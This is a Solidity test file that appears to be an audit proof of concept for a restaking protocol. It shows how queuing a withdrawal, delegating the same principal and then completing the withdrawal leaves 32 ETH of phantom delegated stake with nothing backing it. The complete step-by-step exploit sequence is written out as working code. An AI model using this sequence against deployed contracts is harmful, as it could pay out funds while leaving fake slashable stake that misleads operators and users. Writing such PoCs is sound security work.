// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import { BeaconTestBase } from "./BeaconTestBase.sol";
import { ValidatorPod } from "../../src/beacon/ValidatorPod.sol";

/// @notice PoC: queued beacon withdrawal and delegation double-count the same
///         restaked principal. A staker queues a full withdrawal (allowed while
///         undelegated), then delegates the SAME principal (delegateTo ignores
///         queuedShares), then completes the withdrawal (completeWithdrawal ignores
///         delegatorTotalDelegated). Result: real ETH leaves the pod while a live,
///         fully-backed-looking delegation persists with ZERO underlying assets.
contract PoCDoubleCountTest is BeaconTestBase {
    function test_poc_queueThenDelegateThenWithdraw_phantomStake() public {
        // Staker restakes 32 ETH of beacon principal -> beacon-pool shares.
        ValidatorPod pod = _createPodWithShares(podOwner1, 32 ether);
        // The pod physically holds the 32 ETH of (already-withdrawn) beacon principal.
        vm.deal(address(pod), 32 ether);

        // An operator exists to delegate to.
        _registerOperator(operator1, MIN_OPERATOR_STAKE);

        uint256 shares = podManager.getSharesUint(podOwner1);
        assertEq(shares, 32 ether, "32 ETH shares minted");

        // Step 1: queue a withdrawal of ALL shares (delegation == 0, so allowed).
        vm.prank(podOwner1);
        bytes32 wRoot = podManager.queueWithdrawal(shares);

        // Step 2: delegate the SAME 32 ETH to the operator. delegateTo computes
        // availableAssets from the FULL beacon valuation and never subtracts the
        // already-queued shares, so this passes.
        vm.prank(podOwner1);
        podManager.delegateTo(operator1, 32 ether);

        assertEq(podManager.operatorDelegatedStake(operator1), 32 ether, "operator shows 32 ETH delegated");

        // Step 3: wait out the delay and complete the withdrawal. completeWithdrawal
        // never checks delegatorTotalDelegated, so the real ETH is paid out.
        vm.roll(block.number + podManager.withdrawalDelayBlocks());

        uint256 balBefore = podOwner1.balance;
        vm.prank(podOwner1);
        podManager.completeWithdrawal(wRoot);
        uint256 received = podOwner1.balance - balBefore;

        // The staker got their full principal back...
        assertEq(received, 32 ether, "staker withdrew full 32 ETH");
        assertEq(podManager.getSharesUint(podOwner1), 0, "beacon shares fully burned");
        assertEq(podManager.totalAssetsOf(podOwner1), 0, "beacon pool drained");
        assertEq(address(pod).balance, 0, "pod ETH fully removed");

        // ...yet the operator STILL reports 32 ETH of delegated, slashable stake
        // that is now backed by nothing. Phantom stake / double count.
        assertEq(
            podManager.operatorDelegatedStake(operator1),
            32 ether,
            "PHANTOM: 32 ETH delegated stake persists with zero backing"
        );
        assertEq(
            podManager.getDelegation(podOwner1, operator1),
            32 ether,
            "PHANTOM: delegator still shows 32 ETH delegated after exiting"
        );
        assertEq(
            podManager.delegatorTotalDelegated(podOwner1), 32 ether, "deposit counter still 32 ETH after full exit"
        );
    }
}
